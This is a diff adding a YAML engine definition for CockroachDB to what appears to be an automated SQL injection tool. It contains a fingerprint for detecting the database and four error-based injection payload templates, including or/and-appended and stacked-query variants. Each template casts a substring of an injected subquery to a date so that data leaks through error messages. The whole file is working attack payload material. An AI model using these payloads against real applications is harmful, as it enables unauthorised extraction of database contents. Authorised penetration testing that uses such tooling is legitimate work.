@@ -1,0 +1,45 @@
+engine: CockroachDB
+clone: postgres.yml
+
+strategy:
+  configuration:
+    fingerprint:
+      errorMessage:
+        - "(?<!postgres.*)ERROR: unterminated quoted identifier at or near"
+      engineSpecific: case when ${test} then split_part('a','',1)else ''||crdb_internal.node_id() end='a'
+  error:
+    method:
+    # need cast(as date) with substr instead of int for correct result
+
+      - name: Cast:or
+        query: |
+          /* ERROR: invalid input syntax for type numeric: "<sqli>" */
+          or now() = cast(substr(''||(
+              ${window}
+              ),1,40) as date
+          )
+        capacity: 255
+
+      - name: Cast:and
+        query: |
+          and now() = cast(substr(''||(
+              ${window}
+              ),1,40) as date
+          )
+        capacity: 255
+
+      - name: Cast:none
+        query: |
+          cast(substr(''||(
+              ${window}
+              ),1,40) as date
+          )
+        capacity: 255
+
+      - name: Cast:stack
+        query: |
+          ; select cast(substr(''||(
+              ${window}
+              ),1,40) as date
+          )
+        capacity: 255
